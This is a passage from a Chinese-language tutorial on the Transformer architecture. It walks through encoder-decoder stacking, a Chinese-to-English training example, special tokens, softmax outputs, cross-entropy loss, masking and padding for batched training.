style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span></span></span></span></span>和原始输入<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>的长度<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">seq\_len</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span></span></span></span></span>可以不一样？其实很简单，你自己试一试就知道了，将这两个不一样长度的矩阵输入到自注意力矩阵中，按照上述讲解的自注意力矩阵算法，自己动手，看看其输出矩阵的形状是什么样子的。</p>
<p>最后你会发现<strong>输出序列长度与解码器输入长度 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">seq\_len</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span></span></span></span></span> 保持一致，而与编码器输出长度 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>e</mi><mi>w</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">new\_seq\_len</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span></span></span></span></span> 无关</strong>。正是这一特性赋予了 Transformer 极大的灵活性，使其能够轻松处理如机器翻译中源语言与目标语言句子长度不等的情况，<strong>实现了输入与输出序列长度的解耦</strong>。</p>
<hr/>
<p>最后的最后，我们将上文中讲解的编码器层（Transformer Encoder Layer）与解码器层（Transforme Decoder Layer）模块，按照论文《Attention Is All You Need》中的蓝图，层层堆叠、顺序连接，最终构建出 Transformer 模型的完整架构。其整体结构如下图所示，它清晰展示了数据从输入到输出的完整流程：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a4ade1bb54b49bdbced29db6617d020~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=R29Oc559wEvBd7andofff%2Fm0fsA%3D" alt="c14.jpg" width="100%" loading="lazy"/></p>
<p align="center">「最右侧的Transformer架构图来源：《Attention Is All You Need》」</p>
<p>由于 Transformer 架构设计的初衷就是为了解决序列到序列（Seq2Seq）任务，特别是机器翻译，因此我们以中英翻译为例来阐释这个网络的工作流程。你会看到，其设计哲学与人类翻译的过程有异曲同工之妙。</p>
<p>先来看左侧的编码器堆栈，它是由<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span>个完全相同的编码器层（Transformer Encoder Layer）堆叠而成。信息在层间逐级传递、不断被提炼和抽象，在最后一层输出的是一个富含整个输入序列上下文信息的<strong>高级语义表示矩阵</strong>。这个高级语义矩阵将被复制多份，传输给解码器堆栈中的<strong>每一个</strong>解码器层作为“知识参考”。</p>
<p>再来看右侧的解码器堆栈，它同样是由<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span>个完全相同的解码器层（Transforme Decoder Layer）堆叠而成。它的职责是<strong>参考编码器提供的“高级语义矩阵”，自主地、逐个单词地生成目标语言句子</strong>。</p>
<p>可以这样理解，假设我们要翻译“人山人海”，我们肯定不是直接逐字翻译成“people mountain people sea”，这太怪了。而是我们在理解了“人山人海”所表达的意思后（这就是编码器干的事情），然后按照这个意思翻译成英文（这就是解码器），“a huge crowd of people”。</p>
<blockquote>
<p>题外话：说到翻译，我想到了一个有趣的解读。很多人都说中国的古诗词，文言文，很难翻译成英文，因为翻译后就丢失了原有的中文的那种感觉和意境，比如“孤舟蓑笠翁，独钓寒江雪”，你怎么翻译都翻译不出这种味道；同样的，一些英文诗只有在英文的语境下才能体会它的美，翻译成中文就变成大白话了。或许正如一句名言所说：什么是诗？诗，就是在翻译中丢失的东西（Lost in Translation）。</p>
</blockquote>
<p>那如何使用这个网络呢？如何利用它训练一个中译英翻译器呢？</p>
<p>就以中文“我喜欢深度学习”翻译成英文“I like deep learning”为例，来详细解析其训练流程。这本质上是一个序列到序列（Seq2Seq）的监督学习任务：源句作为输入，目标句作为标签。</p>
<p>首先进行数据预处理与分词：</p>
<ul>
<li>源语言（中文）分词：<code>[“我”, “喜欢”, “深度学习”]</code>，序列长度 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mrow><mi>s</mi><mi>r</mi><mi>c</mi></mrow></msub><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">L_{src}=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">src</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">3</span></span></span></span></span>。</li>
<li>目标语言（英文）分词并添加特殊标记：
<ul>
<li>解码器输入：<code>[“&lt;sos&gt;”, “I”, “like”, “deep”, “learning”]</code>，序列长度 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub><mo>=</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">L_{out}=5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">5</span></span></span></span></span>。</li>
<li>标签：<code>[“I”, “like”, “deep”, “learning”,"&lt;eos&gt;"]</code>，序列长度 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mrow><mi>t</mi><mi>g</mi><mi>t</mi></mrow></msub><mo>=</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">L_{tgt}=5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">5</span></span></span></span></span>。</li>
</ul>
</li>
</ul>
<p>注意这里要给目标句子加上开始标签<code>&lt;sos&gt;</code>和结束标签<code>&lt;eos&gt;</code>，要不然解码器就不知道从哪里开始，到哪里结束生成一个句子了。</p>
<p>若你对词向量（word embeddings）或特殊标记的作用还不熟悉，建议先了解自然语言处理中的词表示基础。不过没关系，我马上就会写一篇专门关于词向量的新的文章，即使0基础自然语言处理也能看懂，看到这里不妨给我个关注吧。(๑˃̵ᴗ˂̵)و  ✨</p>
<p>分词后的序列通过词嵌入层转换为稠密向量表示：</p>
<ul>
<li>中文序列通过一个嵌入层（Embedding1）转换为词向量矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mrow><mi>s</mi><mi>r</mi><mi>c</mi></mrow></msub></mrow><annotation encoding="application/x-tex">X_{src}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">src</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>。</li>
<li>英文序列通过另一个嵌入层（Embedding2）转换为词向量矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">X_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>。</li>
</ul>
<p>例如</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 假设 维度 = 512</span>
X_src = [[<span class="hljs-number">0.12</span>, <span class="hljs-number">0.71</span>, ..., <span class="hljs-number">0.32</span>],  <span class="hljs-comment"># “我”的词向量</span>
         [<span class="hljs-number">0.15</span>, <span class="hljs-number">0.31</span>, ..., <span class="hljs-number">0.46</span>],  <span class="hljs-comment"># “喜欢”的词向量</span>
         [<span class="hljs-number">0.09</span>, <span class="hljs-number">0.52</span>, ..., <span class="hljs-number">0.87</span>]]  <span class="hljs-comment"># “深度学习”的词向量</span>

X_out = [[<span class="hljs-number">0.01</span>, <span class="hljs-number">0.80</span>, ..., <span class="hljs-number">0.10</span>],  <span class="hljs-comment"># &lt;sos&gt;</span>
         [<span class="hljs-number">0.45</span>, <span class="hljs-number">0.23</span>, ..., <span class="hljs-number">0.67</span>],  <span class="hljs-comment"># “I”</span>
         [<span class="hljs-number">0.33</span>, <span class="hljs-number">0.19</span>, ..., <span class="hljs-number">0.55</span>],  <span class="hljs-comment"># “like”</span>
         [<span class="hljs-number">0.87</span>, <span class="hljs-number">0.41</span>, ..., <span class="hljs-number">0.22</span>],  <span class="hljs-comment"># “deep”</span>
         [<span class="hljs-number">0.29</span>, <span class="hljs-number">0.64</span>, ..., <span class="hljs-number">0.38</span>]]  <span class="hljs-comment"># “learning”</span>
</code></pre>
<p>这两个矩阵输入到Transformer中后经过一通计算，最后在解码器最后一层输出的就是和<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">X_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>相同形状的矩阵<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi></mrow><annotation encoding="application/x-tex">O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span></span></span>，例如：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 解码器输出示意（每个向量对应一个时间步的表示）</span>
O =  [[<span class="hljs-number">0.74</span>, <span class="hljs-number">0.22</span>, ..., <span class="hljs-number">0.62</span>],  <span class="hljs-comment"># 对应 "&lt;sos&gt;" 位置的输出 , 最终要和标签"I"作损失</span>
      [<span class="hljs-number">0.35</span>, <span class="hljs-number">0.58</span>, ..., <span class="hljs-number">0.56</span>],  <span class="hljs-comment"># 对应 "I" 位置的输出 , 最终要和标签"like"作损失</span>
      [<span class="hljs-number">0.53</span>, <span class="hljs-number">0.40</span>, ..., <span class="hljs-number">0.41</span>],  <span class="hljs-comment"># 对应 "like" , 和标签"deep"作损失</span>
      [<span class="hljs-number">0.18</span>, <span class="hljs-number">0.63</span>, ..., <span class="hljs-number">0.79</span>],  <span class="hljs-comment"># 对应 "deep" , 和标签"learning"作损失</span>
      [<span class="hljs-number">0.07</span>, <span class="hljs-number">0.73</span>, ..., <span class="hljs-number">0.24</span>]]  <span class="hljs-comment"># 对应 "learning" , 和标签"&lt;eos&gt;"作损失</span>
</code></pre>
<p>最后，矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi></mrow><annotation encoding="application/x-tex">O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span></span></span> 经过一个线性层（Linear），将维度从 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">embed\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span> 映射到英文词表大小 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></span>，得到矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi></mrow><annotation encoding="application/x-tex">Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></span>。接着，对 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi></mrow><annotation encoding="application/x-tex">Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></span> 的每一行应用 softmax 函数，将其转换为一个概率分布矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span>：</p>
<p>其中 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">P_{i,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> 表示第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> 个时间步（对应目标序列第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> 个位置）生成词表中第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span> 个词的概率。最终 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span> 的每一行都是一个在词表上的概率分布，例如第一行对应从 <code>&lt;sos&gt;</code> 之后生成第一个词的概率分布，第二行对应生成第二个词的概率分布，依此类推。</p>
<p>在训练时，我们使用交叉熵损失函数比较 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span> 与真实目标序列的 one-hot 标签，具体而言，对于目标序列 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mrow><mi>t</mi><mi>g</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">X_{tgt}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>=<code>[I,like,deep,learning,&lt;eos&gt;]</code>，我们将其转化为 one-hot 向量形式。由于英文词表大小为<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></span>，则每个单词对应一个<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></span>维的 one-hot 向量，其中对应单词索引的位置为 1，其余为 0。</p>
<p>不要忘了，解码器是带有掩码的，因此序列中的每个子序列都是看不到它的下一个词的，但是能看到它前面的所有词。正是因为如此，它才能这样进行训练。</p>
<p>这其实也就是意味着，如果未来在编码器输入“我喜欢深度学习”的情况下，我在解码器输入<code>[&lt;sos&gt;]</code>，我期望它输出<code>[I]</code>的概率最大；在解码器输入<code>[&lt;sos&gt;，I]</code>，我期望它输出<code>[I，like]</code>；在解码器输入<code>[&lt;sos&gt;，I，like]</code>，我期望它输出<code>[I，like，deep]</code>；在解码器输入<code>[&lt;sos&gt;，I，like，deep]</code>，我期望它输出<code>[I，like，deep，learning]</code>；在解码器输入<code>[&lt;sos&gt;，I，like，deep，learning]</code>，我期望它输出<code>[I，like，deep，learning，&lt;eos&gt;]</code>，最后在遇见<code>&lt;eos&gt;</code>或者输出长度到达预设上限时就停止输入，完成生成。</p>
<p>通常在推理中，采用自回归的方式生成序列，我们只取输出序列的最后一个位置的输出（仅关注最新一步的预测结果），将其加入到输入序列的末尾再次进行输入(就像上面演示的那样)。但是，这种逐词生成的方式在长序列任务中会导致效率问题，因为每一步都需要重新计算整个序列的表示。不过目前已有许多优化方法，但这已超出本篇基础指南的范畴。就不过多介绍了。</p>
<blockquote>
<p><strong>题外话：</strong></p>
<p>上面的例子是使用单一样本进行训练的，而在实际训练中，为了提高硬件利用率和训练稳定性，我们通常会采用<strong>批次训练</strong>（Batch）。此时，输入的张量形状将变为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>b</mi><mi>a</mi><mi>t</mi><mi>c</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mtext>？</mtext><mo separator="true">,</mo><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(batch\_size, seq\_len？, embed\_size)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">ba</span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">？</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span></span>。</p>
<p>但这里存在一个现实问题，就是同一个批次中的句子长度往往各不相同。无法直接组合成一个张量，因此也就无法输入到Transformer中进行训练。</p>
<p>常用的解决方法就是引入填充机制，即在较短序列的末尾添加特殊的填充符号（如<code>&lt;pad&gt;</code>），使该批次中所有序列长度一致。然后在模型中添加掩码来屏蔽填充位置的影响，具体来说就是在注意力机制中，将填充位置对应的注意力权重设置为一个极小的值（如 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">-10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"/><span class="mord">−</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></span>），使得在 softmax 之后这些位置的权重接近 